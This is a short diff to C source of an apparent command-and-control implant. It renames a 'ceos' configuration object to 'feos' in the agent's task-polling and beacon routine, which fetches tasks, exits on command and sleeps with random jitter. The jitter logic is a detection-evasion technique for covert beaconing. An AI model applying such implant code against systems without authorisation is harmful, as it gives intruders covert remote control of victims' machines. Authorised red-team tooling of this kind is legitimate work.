@@ -50,7 +50,7 @@ BOOL handleGetTasking(PParser getTasking)
 					freeParser(taskParser);
 					freeParser(getTasking);
 					freeParser(responseParser);
-					freeCeosConfig();
+					freeFeosConfig();
 
 					ExitProcess(0);		// nothing after this line will get executed
 
@@ -71,7 +71,7 @@ BOOL handleGetTasking(PParser getTasking)
 				freeParser(taskParser);
 				freeParser(getTasking);
 				freeParser(responseParser);
-				freeCeosConfig();
+				freeFeosConfig();
 
 				ExitThread(0);		// nothing after this line will get executed
 
@@ -133,7 +133,7 @@ BOOL routine()
 {
 	// Asking for new tasks
 	PPackage getTask = newPackage(GET_TASKING, TRUE);
-	addInt32(getTask, ceosConfig->numTasks);
+	addInt32(getTask, feosConfig->numTasks);
 
 	PParser ResponseParser = sendPackage(getTask);
 
@@ -145,27 +145,27 @@ BOOL routine()
 	freeParser(ResponseParser);
 	
 	// Sleep (with jitter)
-	if (ceosConfig->jitter < 1) {
-		Sleep(ceosConfig->sleeptime_ms);
+	if (feosConfig->jitter < 1) {
+		Sleep(feosConfig->sleeptime_ms);
 	}
 	else
 	{
-		UINT32 jitter_perc = get_random_int(ceosConfig->jitter);
-		UINT32 jitter_amount = (ceosConfig->sleeptime_ms * jitter_perc)/100;
+		UINT32 jitter_perc = get_random_int(feosConfig->jitter);
+		UINT32 jitter_amount = (feosConfig->sleeptime_ms * jitter_perc)/100;
 		if ((rand() % 2) == 1)
 		{
-			Sleep(ceosConfig->sleeptime_ms + jitter_amount);
+			Sleep(feosConfig->sleeptime_ms + jitter_amount);
 		}
 		else
 		{
-			if (ceosConfig->sleeptime_ms > jitter_amount)
+			if (feosConfig->sleeptime_ms > jitter_amount)
 			{
-				Sleep(ceosConfig->sleeptime_ms - jitter_amount);
+				Sleep(feosConfig->sleeptime_ms - jitter_amount);
 			}
 			else
 			{
 				// ensures sleep time is non-negative
-				Sleep(ceosConfig->sleeptime_ms);
+				Sleep(feosConfig->sleeptime_ms);
 			}
 		}
 	}
